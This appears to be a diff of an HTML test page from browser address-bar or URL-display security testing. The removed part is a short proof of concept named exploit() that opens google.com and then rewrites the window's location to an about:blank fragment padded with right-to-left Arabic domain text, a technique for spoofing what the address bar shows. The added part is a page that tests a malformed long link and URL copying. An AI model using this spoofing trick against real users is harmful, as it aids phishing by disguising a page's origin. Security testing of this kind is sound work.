@@ -1,16 +1,26 @@
-<html>
-  <body>
 
-    <script>
-    function exploit() {
-      var x = window.open("https://www.google.com");
-    setTimeout(function(){x.location='about:blank%23مثال.السعوديةمثال.السعوديةمثال.السعودية'}, 3000)
-    }
-    
-    </script>
-    <br><br><br><br>
-    <a href="#" onclick="exploit();">
-      <center><h1>Click here to go to Google.com</h1></center>
-    </a>
-  </body>
+
+<html>
+	<head></head>
+	<body>
+          <a href='htttps://www.verylongurl.googlecloudplatform.accounts.google.com'>Incorrect long</a>
+
+		Visit this link: <span id="304url">https://www.google.com:1234/</span> (please copy and paste into your address bar)<br>
+
+		<button onclick="copyUrl();">copy url</button>
+		<script>
+		
+
+			function copyUrl(){
+				const url = document.getElementById("304url");
+				if(!window.getSelection) return;
+				var range = document.createRange();
+				range.selectNodeContents(url);
+				var sel = window.getSelection();
+				sel.removeAllRanges();
+				sel.addRange(range);
+				document.execCommand("copy");
+							}
+		</script>
+	</body>
 </html>
